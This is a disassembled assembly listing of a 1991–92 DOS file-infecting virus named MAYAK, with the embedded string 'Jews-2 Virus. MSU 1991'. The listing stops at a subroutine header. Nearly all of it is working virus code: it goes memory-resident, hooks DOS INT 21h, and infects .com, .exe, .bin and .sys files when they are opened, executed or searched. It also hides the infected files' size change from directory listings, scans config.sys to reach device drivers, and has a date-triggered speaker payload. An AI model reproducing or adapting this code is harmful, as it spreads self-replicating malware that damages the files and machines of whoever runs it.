
PAGE  59,132

;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;€€								         €€
;€€			        MAYAK				         €€
;€€								         €€
;€€      Created:   1-Aug-92					         €€
;€€      Passes:    5	       Analysis Options on: none	         €€
;€€								         €€
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€

data_1e		equ	0Ch
data_3e		equ	20h
data_4e		equ	24h
data_5e		equ	84h
data_6e		equ	90h
data_8e		equ	100h
data_9e		equ	917h			;*
data_10e	equ	91Eh			;*
data_11e	equ	5350h			;*
data_14e	equ	927h			;*
data_15e	equ	6
data_16e	equ	46h
data_17e	equ	60h

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	100h

mayak		proc	far

start:
;*		jmp	loc_6			;*
		db	0E9h, 32h, 01h
		db	 60h,0B9h, 00h, 20h

locloop_3:
		loop	locloop_3		; Loop if cx > 0

		mov	al,0
		out	60h,al			; port 60h, keybd data write
		int	20h			; DOS program terminate
		push	ax
		push	cx
		push	si
		push	di
		push	ds
		push	es
		call	sub_2

mayak		endp

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_2		proc	near
		pop	si
		sub	si,9
		nop				;*ASM fixup - sign extn byte
		push	cs
		pop	ds
		mov	[si+44h],cs
		nop				;*ASM fixup - displacement
		mov	[si+62h],cs
		nop				;*ASM fixup - displacement
		mov	[si+46h],bx
		nop				;*ASM fixup - displacement
		mov	[si+48h],es
		nop				;*ASM fixup - displacement
		mov	ax,[si+42h]
		mov	ds:data_15e,ax
		jmp	short $+2		; delay for I/O
		cld				; Clear direction
		mov	ax,7000h
		mov	es,ax
		xor	di,di			; Zero register
		mov	cx,923h
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		mov	cx,7Bh
		rep	stosb			; Rep when cx >0 Store al to es:[di]
		pop	es
		pop	ds
		pop	di
		pop	si
		pop	cx
		pop	ax
;*		jmp	far ptr loc_2		;*
sub_2		endp

		db	0EAh,0C1h, 00h, 68h, 02h
		out	3,al			; port 3, DMA-1 bas&cnt ch 1
		xchg	dx,ds:data_11e[bx+si]
		push	cx
		push	dx
		push	si
		push	di
		push	ds
		push	es
		push	cs
		pop	ds
		les	di,dword ptr ds:data_17e	; Load 32 bit ptr
		mov	si,91Eh
		cld				; Clear direction
		movsw				; Mov [si] to es:[di]
		movsw				; Mov [si] to es:[di]
		movsb				; Mov [si] to es:[di]
;*		call	far ptr sub_1		;*
		db	 9Ah,0CCh, 00h, 68h, 02h
		mov	ax,0FEDAh
		int	21h			; ??INT Non-standard interrupt
		cmp	ax,0ADEFh
		je	loc_4			; Jump if equal
		push	cs
		pop	ds
		mov	ah,34h			; '4'
		int	21h			; DOS Services  ah=function 34h
						;  get DOS critical ptr es:bx
						;*  undocumented function
		mov	word ptr ds:[93Bh],bx
		mov	word ptr ds:[93Dh],es
		lds	si,dword ptr ds:data_16e	; Load 32 bit ptr
		les	di,dword ptr [si+0Eh]	; Load 32 bit ptr
		mov	cl,4
		shr	di,cl			; Shift w/zeros fill
		inc	di
		mov	ax,es
		add	ax,di
		mov	es,ax
		mov	word ptr [si+0Eh],99Eh
		mov	[si+10h],es
		xor	di,di			; Zero register
		push	cs
		pop	ds
		xor	si,si			; Zero register
		cld				; Clear direction
		mov	cx,99Eh
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		mov	di,data_14e
		mov	ds,cx
		mov	si,data_5e
		movsw				; Mov [si] to es:[di]
		movsw				; Mov [si] to es:[di]
		mov	[si-2],es
		mov	word ptr [si-4],147h
		mov	si,data_4e
		movsw				; Mov [si] to es:[di]
		movsw				; Mov [si] to es:[di]
		mov	[si-2],es
		mov	word ptr [si-4],384h
		mov	ah,2Ah			; '*'
		int	21h			; DOS Services  ah=function 2Ah
						;  get date, cx=year, dh=month
						;   dl=day, al=day-of-week 0=SUN
		call	sub_10
		sub	ax,word ptr cs:[917h]
		cmp	ax,5
		jb	loc_4			; Jump if below
		mov	si,data_3e
		movsw				; Mov [si] to es:[di]
		movsw				; Mov [si] to es:[di]
		mov	[si-2],es
		mov	word ptr [si-4],2C2h
loc_4:
		pop	es
		pop	ds
		pop	di
		pop	si
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		retf				; Return far
		db	'Jews-2 Virus. MSU 1991'
		db	 1Eh, 06h,0E8h, 00h, 00h, 5Eh
		db	 81h,0EEh, 03h, 01h,0E8h,0CAh
		db	 02h, 0Eh, 0Eh, 1Fh, 07h,0E8h
		db	 25h, 03h, 07h, 8Ch,0C0h, 05h
		db	 10h, 00h, 2Eh, 01h, 84h, 24h
		db	 01h, 1Fh,0E8h,0FFh, 02h,0EAh
		db	 00h
		db	0, 0, 0
loc_6:
		call	sub_3

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_3		proc	near
		pop	si
		sub	si,129h
		call	sub_5
		push	si
		mov	di,data_8e
		add	si,data_10e
		movsw				; Mov [si] to es:[di]
		movsb				; Mov [si] to es:[di]
		pop	si
		call	sub_8
		mov	ax,100h
		push	ax
		call	sub_7
		retn
sub_3		endp

		pushf				; Push flags
		cmp	ax,0FEDAh
		jne	loc_7			; Jump if not equal
		mov	ax,0ADEFh
		les	bx,dword ptr cs:[927h]	; Load 32 bit ptr
		popf				; Pop flags
		iret				; Interrupt return
loc_7:
		push	bx
		push	cx
		push	dx
		push	di
		push	si
		push	bp
		push	ds
		push	es
		xor	si,si			; Zero register
		call	sub_5
		cmp	ah,3Ch			; '<'
		je	loc_13			; Jump if equal
		cmp	ah,5Bh			; '['
		je	loc_13			; Jump if equal
		cmp	ah,3Dh			; '='
		je	loc_15			; Jump if equal
		cmp	ah,3Eh			; '>'
		je	loc_17			; Jump if equal
		cmp	ah,4Bh			; 'K'
		jne	loc_10			; Jump if not equal
		jmp	loc_20
loc_10:
		cmp	ah,4Eh			; 'N'
		jne	loc_11			; Jump if not equal
		jmp	loc_26
loc_11:
		cmp	ah,4Fh			; 'O'
		jne	loc_12			; Jump if not equal
		jmp	loc_28
loc_12:
		jmp	loc_31
loc_13:
		int	3			; Debug breakpoint
		jnc	loc_14			; Jump if carry=0
		jmp	loc_29
loc_14:
		push	ax
		call	sub_12
		pop	bx
		mov	byte ptr cs:[943h][bx],al
		mov	byte ptr cs:[957h][bx],ah
		mov	ax,bx
		jmp	loc_30
loc_15:
		push	ax
		mov	al,2
		int	3			; Debug breakpoint
		jnc	loc_16			; Jump if carry=0
		pop	ax
		jmp	loc_31
loc_16:
		pop	bx
		push	ax
		call	sub_12
		pop	bx
		mov	byte ptr cs:[943h][bx],al
		mov	byte ptr cs:[957h][bx],ah
		call	sub_21
		mov	ax,bx
		jmp	loc_30
loc_17:
		push	ax
		push	cs
		pop	ds
		cmp	bx,5
		jb	loc_19			; Jump if below
		cmp	bx,18h
		ja	loc_19			; Jump if above
		mov	al,byte ptr ds:[943h][bx]
		mov	ah,byte ptr ds:[957h][bx]
		mov	byte ptr ds:[943h][bx],0
		mov	byte ptr ds:[957h][bx],0
		cmp	al,2
		jb	loc_18			; Jump if below
		cmp	ah,2
		jbe	loc_19			; Jump if below or =
loc_18:
		call	sub_20
loc_19:
		pop	ax
		jmp	loc_31
loc_20:
		mov	word ptr cs:[99Ah],dx
		mov	word ptr cs:[99Ch],ds
		push	ax
		call	sub_12
		mov	word ptr cs:[998h],ax
		push	ax
		mov	ax,3D02h
		int	3			; Debug breakpoint
		mov	bx,ax
		pop	ax
		pop	cx
		push	cx
		jc	loc_25			; Jump if carry Set
		and	cl,cl
		jz	loc_23			; Jump if zero
		call	sub_21
		mov	ah,3Eh			; '>'
		int	3			; Debug breakpoint
		pop	ax
		call	sub_4
		pop	bx
		call	dword ptr cs:[927h]
		pushf				; Push flags
		push	bx
		push	cx
		push	dx
		push	di
		push	si
		push	bp
		push	ds
		push	es
		push	ax
		xor	si,si			; Zero register
		call	sub_5
		mov	ax,word ptr cs:[998h]
		lds	dx,dword ptr cs:[99Ah]	; Load 32 bit ptr
		cmp	al,2
		jb	loc_22			; Jump if below
		cmp	ah,2
		ja	loc_22			; Jump if above
loc_21:
		pop	ax
		call	sub_4
		pop	bx
		popf				; Pop flags
		retf	2			; Return far
loc_22:
		push	ax
		mov	ax,3D02h
		int	3			; Debug breakpoint
		mov	bx,ax
		pop	ax
		jc	loc_21			; Jump if carry Set
		call	sub_20
		mov	ah,3Eh			; '>'
		int	3			; Debug breakpoint
		jmp	short loc_21
loc_23:
		cmp	al,2
		jb	loc_24			; Jump if below
		cmp	ah,2
		jbe	loc_25			; Jump if below or =
loc_24:
		call	sub_20
loc_25:
		mov	ah,3Eh			; '>'
		int	3			; Debug breakpoint
		pop	ax
		jmp	short loc_31
loc_26:
		int	3			; Debug breakpoint
		jc	loc_29			; Jump if carry Set
		mov	ah,2Fh			; '/'
		int	21h			; DOS Services  ah=function 2Fh
						;  get DTA ptr into es:bx
		push	es
		pop	ds
loc_27:
		mov	ax,[bx+16h]
		and	ax,1Fh
		cmp	ax,1Fh
		jne	loc_30			; Jump if not equal
		sub	word ptr [bx+1Ah],923h
		sbb	word ptr [bx+1Ch],0
		and	word ptr [bx+16h],0FFE0h
		jmp	short loc_30
loc_28:
		int	3			; Debug breakpoint
		mov	bx,dx
		jnc	loc_27			; Jump if carry=0
loc_29:
		call	sub_4
		pop	bx
		popf				; Pop flags
		stc				; Set carry flag
		retf	2			; Return far
loc_30:
		call	sub_4
		pop	bx
		popf				; Pop flags
		clc				; Clear carry flag
		retf	2			; Return far
loc_31:
		call	sub_4
		pop	bx
		popf				; Pop flags
		jmp	dword ptr cs:[927h]
		push	ax
		push	cx
		push	dx
		push	si
		push	ds
		push	es
		push	cs
		pop	ds
		cmp	byte ptr ds:[34Eh],0
		jne	loc_32			; Jump if not equal
		les	si,dword ptr ds:[93Bh]	; Load 32 bit ptr
		cmp	byte ptr es:[si],0
		jne	$+6Ah			; Jump if not equal
		mov	ah,2Ch			; ','
		int	21h			; DOS Services  ah=function 2Ch
						;  get time, cx=hrs/min, dx=sec
		mov	dl,cl
		cmp	dx,1E3Bh
		jne	$+5Eh			; Jump if not equal
		mov	byte ptr ds:[34Eh],1
		mov	byte ptr ds:[947h],1
		mov	word ptr ds:[943h],34Fh
loc_32:
		dec	byte ptr ds:[34Eh]
		jnz	$+48h			; Jump if not zero
		mov	si,word ptr ds:[943h]
		cld				; Clear direction
loc_33:
		lodsb				; String [si] to al
		mov	byte ptr ds:[34Eh],al
		and	al,al
		jnz	loc_35			; Jump if not zero
		dec	byte ptr ds:[947h]
		jz	loc_34			; Jump if zero
		mov	si,word ptr ds:[945h]
		jmp	short loc_33
loc_34:
		lodsb				; String [si] to al
		mov	word ptr ds:[945h],si
		mov	byte ptr ds:[947h],al
		and	al,al
		jnz	loc_33			; Jump if not zero
		jmp	short $+21h
loc_35:
		lodsw				; String [si] to ax
		mov	cx,ax
		mov	word ptr ds:[943h],si
		mov	al,0B6h
		out	43h,al			; port 43h, 8253 wrt timr mode
		mov	dx,12h
		mov	ax,34DDh
		div	cx			; ax,dx rem=dx:ax/reg
		out	42h,al			; port 42h, 8253 timer 2 spkr
		mov	al,ah
		out	42h,al			; port 42h, 8253 timer 2 spkr
		in	al,61h			; port 61h, 8255 port B, read
		or	al,3
		out	61h,al			; port 61h, 8255 B - spkr, etc
		pop	es
		pop	ds
		pop	si
		pop	dx
		pop	cx
		pop	ax
		jmp	dword ptr cs:[92Fh]
		add	[bx+si],al
		add	ax,[bx]
		into				; Int 4 on overflow
		add	al,[bx]
		push	si
		add	ax,[bx]
		xor	al,4
		pop	es
		push	si
		add	cx,word ptr ds:[3BFh]
		pop	es
		push	si
		add	ax,[bx]
		add	cx,word ptr es:[434h]
		push	cs
		mov	di,1103h
		into				; Int 4 on overflow
		add	dh,[bp+si]
		db	0FFh,0FFh, 00h, 05h, 02h,0E8h
		db	 03h, 10h,0FFh,0FFh, 00h, 01h
		db	 09h,0E8h, 03h, 01h,0FFh,0FFh
		db	 00h, 00h, 50h, 1Eh,0E4h, 60h
		db	 3Ch, 53h, 75h, 35h,0B8h, 40h
		db	 00h, 8Eh,0D8h,0A0h, 17h, 00h
		db	 24h, 0Ch, 3Ch, 0Ch, 75h, 27h
		db	0C7h, 06h, 72h, 00h, 34h, 12h
		db	0E4h, 61h, 8Ah,0E0h, 0Ch, 80h
		db	0E6h, 61h, 86h,0E0h,0E6h, 61h
		db	0B0h, 20h,0E6h, 20h, 33h,0F6h
		db	0E8h, 20h, 00h, 0Eh, 0Eh, 1Fh
		db	 07h,0E8h, 7Bh, 00h,0EAh,0F0h
		db	0FFh, 00h,0F0h
		db	 1Fh, 58h, 2Eh,0FFh, 2Eh, 2Bh
		db	 09h

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_4		proc	near
		call	sub_6
		pop	bx
		pop	es
		pop	ds
		pop	bp
		pop	si
		pop	di
		pop	dx
		pop	cx
		jmp	bx			;*Register jump

;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ

sub_5:
		push	ax
		push	bx
		push	ds
		push	es
		xor	ax,ax			; Zero register
		mov	ds,ax
		les	ax,dword ptr ds:data_1e	; Load 32 bit ptr
		mov	word ptr cs:[933h][si],ax
		mov	word ptr cs:[935h][si],es
		mov	ax,0FEDAh
		int	21h			; ??INT Non-standard interrupt
		cmp	ax,0ADEFh
		je	loc_37			; Jump if equal
		les	bx,dword ptr ds:data_5e	; Load 32 bit ptr
loc_37:
		mov	ds:data_1e,bx
		mov	word ptr ds:data_1e+2,es
		pop	es
		pop	ds
		pop	bx
		pop	ax
		retn
sub_4		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_6		proc	near
		push	ax
		push	ds
		push	es
		xor	ax,ax			; Zero register
		mov	ds,ax
		les	ax,dword ptr cs:[933h][si]	; Load 32 bit ptr
		mov	ds:data_1e,ax
		mov	word ptr ds:data_1e+2,es
		pop	es
		pop	ds
		pop	ax
		retn
sub_6		endp

		db	0B0h, 03h,0CFh

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_7		proc	near
		call	sub_6
		xor	ax,ax			; Zero register
		xor	bx,bx			; Zero register
		mov	cx,0FFh
		mov	dx,cs
		mov	di,sp
		add	di,4
		mov	si,100h
		xor	bp,bp			; Zero register
		retn
sub_7		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_8		proc	near
		mov	ah,2Ah			; '*'
		int	3			; Debug breakpoint
		call	sub_10
		mov	word ptr ds:[917h][si],ax
		mov	ax,3D00h
		lea	dx,[si+4F0h]		; Load effective addr
		int	3			; Debug breakpoint
		mov	bx,ax
		jnc	loc_38			; Jump if carry=0
		retn
loc_38:
		mov	ah,3Fh			; '?'
		lea	dx,[si+970h]		; Load effective addr
		mov	cx,28h
		int	3			; Debug breakpoint
		and	ax,ax
		jnz	loc_39			; Jump if not zero
		jmp	loc_46
loc_39:
		mov	cx,ax
		mov	di,dx
		mov	al,0Dh
		repne	scasb			; Rep zf=0+cx >0 Scan es:[di] for al
		jnz	loc_38			; Jump if not zero
		mov	byte ptr [di-1],20h	; ' '
		neg	cx
		inc	cx
		mov	ax,cx
		cwd				; Word to double word
		xchg	cx,dx
		mov	ax,4201h
		int	3			; Debug breakpoint
		mov	cx,28h
		mov	al,20h			; ' '
		lea	di,[si+970h]		; Load effective addr
		push	di
		push	cx

locloop_40:
		scasb				; Scan es:[di] for al
		jc	loc_41			; Jump if carry Set
		mov	[di-1],al
loc_41:
		loop	locloop_40		; Loop if cx > 0

		pop	cx
		pop	di
		repe	scasb			; Rep zf=1+cx >0 Scan es:[di] for al
		push	si
		dec	di
		push	di
		lea	di,[si+4FEh]		; Load effective addr
		pop	si
		mov	cx,6

locloop_42:
		lodsb				; String [si] to al
		or	al,20h			; ' '
		scasb				; Scan es:[di] for al
		loopz	locloop_42		; Loop if zf=1, cx>0

		mov	di,si
		pop	si
		jnz	loc_38			; Jump if not zero
		mov	cx,28h
		mov	al,20h			; ' '
		repe	scasb			; Rep zf=1+cx >0 Scan es:[di] for al
		cmp	byte ptr [di-1],3Dh	; '='
		jne	loc_38			; Jump if not equal
		repe	scasb			; Rep zf=1+cx >0 Scan es:[di] for al
		dec	di
		mov	dx,di
		repne	scasb			; Rep zf=0+cx >0 Scan es:[di] for al
		mov	byte ptr [di-1],0
		push	bx
		call	sub_11
		jz	loc_44			; Jump if zero
		mov	di,dx
		cmp	byte ptr [di],5Ch	; '\'
		je	loc_43			; Jump if equal
		dec	di
		mov	byte ptr [di],5Ch	; '\'
loc_43:
		dec	di
		dec	di
		mov	word ptr [di],3A63h
		mov	dx,di
loc_44:
		mov	ax,3D02h
		int	3			; Debug breakpoint
		jc	loc_45			; Jump if carry Set
		mov	bx,ax
		mov	ax,402h
		call	sub_20
		mov	ah,3Eh			; '>'
		int	3			; Debug breakpoint
loc_45:
		pop	bx
		jmp	loc_38
loc_46:
		mov	ah,3Eh			; '>'
		int	3			; Debug breakpoint
		retn
sub_8		endp

		db	'c:\config.sys'
		db	 00h, 64h, 65h, 76h, 69h, 63h
		db	 65h

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_10		proc	near
		sub	cx,7BCh
		dec	dx
		dec	dh
		mov	al,1Fh
		mul	dh			; ax = reg * al
		xor	dh,dh			; Zero register
		add	dx,ax
		push	dx
		mov	ax,16Eh
		mul	cx			; dx:ax = reg * ax
		pop	dx
		add	ax,dx
		retn
sub_10		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_11		proc	near
		mov	di,dx
		mov	cx,0FFFFh
		xor	al,al			; Zero register
		repne	scasb			; Rep zf=0+cx >0 Scan es:[di] for al
		neg	cx
		dec	cx
		dec	di
		dec	di
		mov	bx,di
		mov	di,dx
		mov	al,3Ah			; ':'
		repne	scasb			; Rep zf=0+cx >0 Scan es:[di] for al
		retn
sub_11		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_12		proc	near
		cld				; Clear direction
		push	bx
		push	si
		push	ds
		pop	es
		call	sub_11
		jnz	loc_48			; Jump if not zero
		mov	al,[di-2]
		or	al,20h			; ' '
		sub	al,61h			; 'a'
		jmp	short loc_49
loc_48:
		mov	ah,19h
		int	3			; Debug breakpoint
loc_49:
		std				; Set direction flag
		push	cs
		pop	es
		lea	di,[si+584h]		; Load effective addr
		mov	si,bx
		mov	bl,al
		mov	ah,4
loc_50:
		mov	cx,4
		push	di
		push	si

locloop_51:
		lodsb				; String [si] to al
		or	al,20h			; ' '
		scasb				; Scan es:[di] for al
		loopz	locloop_51		; Loop if zf=1, cx>0

		pop	si
		pop	di
		jz	loc_53			; Jump if zero
		sub	di,4
		dec	ah
		jz	loc_53			; Jump if zero
		jmp	short loc_50
loc_53:
		cld				; Clear direction
		mov	al,bl
		pop	si
		pop	bx
		retn
sub_12		endp

		db	'.com.exe.bin.sys'

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_13		proc	near
		mov	ax,4200h
		xor	cx,cx			; Zero register
		int	3			; Debug breakpoint
		retn
sub_13		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_14		proc	near
		mov	ax,4202h
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		int	3			; Debug breakpoint
		retn
sub_14		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_15		proc	near
		push	ax
		and	ah,ah
		jz	loc_56			; Jump if zero
		xor	dx,dx			; Zero register
		call	sub_13
		mov	ah,3Fh			; '?'
		lea	dx,[si+91Eh]		; Load effective addr
		mov	cx,6
		int	3			; Debug breakpoint
		cmp	ax,6
		jne	loc_56			; Jump if not equal
		pop	ax
		push	ax
		cmp	ah,2
		jb	loc_55			; Jump if below
		jnz	loc_54			; Jump if not zero
		cmp	word ptr ds:[91Eh][si],5A4Dh
		jne	loc_56			; Jump if not equal
		jmp	short loc_55
loc_54:
		cmp	word ptr ds:[91Eh][si],0FFFFh
		jne	loc_56			; Jump if not equal
		cmp	word ptr ds:[920h][si],0FFFFh
		jne	loc_56			; Jump if not equal
loc_55:
		pop	ax
		stc				; Set carry flag
		retn
loc_56:
		pop	ax
		clc				; Clear carry flag
		retn
sub_15		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
